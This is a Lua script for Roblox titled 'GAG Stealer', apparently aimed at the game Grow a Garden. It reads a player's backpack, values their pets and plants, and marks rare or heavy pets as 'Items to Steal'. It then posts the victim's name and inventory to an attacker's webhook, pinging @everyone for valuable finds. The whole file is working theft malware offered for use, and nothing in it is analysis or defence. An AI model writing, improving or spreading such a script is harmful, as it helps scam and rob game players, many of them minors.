-- âœ… GAG Stealer Full Script (Webhook + Steal + Rare Priority)

-- Config load from external file (loadstring) local webhook = Webhook local usernames = {Username} if webhook == "" then return warn("Missing webhook") end

-- Services & modules local Players = game:GetService("Players") local HttpService = game:GetService("HttpService") local plr = Players.LocalPlayer local backpack = plr:WaitForChild("Backpack") local rep = game:GetService("ReplicatedStorage") local modules = rep:WaitForChild("Modules")

local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue")) local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities")) local petRegistry = require(rep:WaitForChild("Data"):WaitForChild("PetRegistry")) local numberUtil = require(modules:WaitForChild("NumberUtil")) local dataService = require(modules:WaitForChild("DataService"))

-- Rare pets config local rarePets = { "Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox" }

-- State tracking local totalVal, invCount = 0, 0 local itemsToSend, fullInv = {}, {} local ping = false

-- Pet value calculation local function calcPetValue(pet) local egg = pet.PetData.HatchedFrom if not egg or egg == "" then return 0 end local eggData = petRegistry.PetEggs[egg] if not eggData then return 0 end local rarity = eggData.RarityData.Items[pet.PetType] if not rarity then return 0 end local range = rarity.GeneratedPetData.WeightRange if not range then return 0 end local l = numberUtil.ReverseLerp(range[1], range[2], pet.PetData.BaseWeight) local w = math.lerp(0.8, 1.2, l) local lvl = math.lerp(0.15, 6, petUtils:GetLevelProgress(pet.PetData.Level)) return math.floor(petRegistry.PetList[pet.PetType].SellPrice * w * lvl) end

-- Weight parsing local function getWeight(name) local s = name:match("%[(%d+%.?%d*) ?KG%]") return tonumber(s) or 0 end

-- Collect inventory data for _, tool in ipairs(backpack:GetChildren()) do if tool:IsA("Tool") then invCount += 1 local entry = {Type="Plant", Name=tool.Name}

if tool:GetAttribute("ItemType") == "Pet" then
  local pet = dataService:GetData().PetsData.PetInventory.Data[tool:GetAttribute("PET_UUID")]
  entry.Type = "Pet"
  entry.Name = pet.PetType
  entry.Value = calcPetValue(pet)
  entry.Weight = getWeight(tool.Name)

  if table.find(rarePets, entry.Name) or entry.Weight >= 10 then
    ping = true
    table.insert(itemsToSend, entry)
  end
else
  entry.Value = calcPlantValue(tool)
end

totalVal += (entry.Value or 0)
table.insert(fullInv, entry)

end end

if #fullInv == 0 then return end

-- Sort by rare priority table.sort(itemsToSend, function(a, b) local ar = table.find(rarePets, a.Name) local br = table.find(rarePets, b.Name) if ar and not br then return true elseif br and not ar then return false end return (a.Value or 0) > (b.Value or 0) end)

-- Build webhook message local fields = { {name = "Victim", value = plr.Name, inline = true}, {name = "Inventory Items", value = tostring(invCount), inline = true}, {name = "Stealable Items", value = tostring(#itemsToSend), inline = true}, {name = "Total Value", value = "\226\130\162" .. tostring(totalVal), inline = false}, { name = "\240\159\145\146 Full Inventory", value = (function() local a = {} for _, e in ipairs(fullInv) do table.insert(a, ("[%s] %s - \226\130\162%s"):format(e.Type, e.Name, e.Value or 0)) end local txt = table.concat(a, "\n") return #txt > 1024 and txt:sub(1, 1000) .. "\n... and more" or txt end)(), inline = false }, { name = "\240\159\148\175 Items to Steal", value = (function() if #itemsToSend == 0 then return "None" end local a = {} for _, e in ipairs(itemsToSend) do table.insert(a, ("[%s] %s - \226\130\162%s"):format(e.Type, e.Name, e.Value or 0)) end local txt = table.concat(a, "\n") return #txt > 1024 and txt:sub(1, 1000) .. "\n... and more" or txt end)(), inline = false } }

local payload = { content = ping and "@everyone" or "", embeds = {{ title = "\240\159\148\172 GAG Stealer", color = 65280, fields = fields, footer = {text = "GAG stealer"} }} }

-- Send webhook request({ Url = webhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
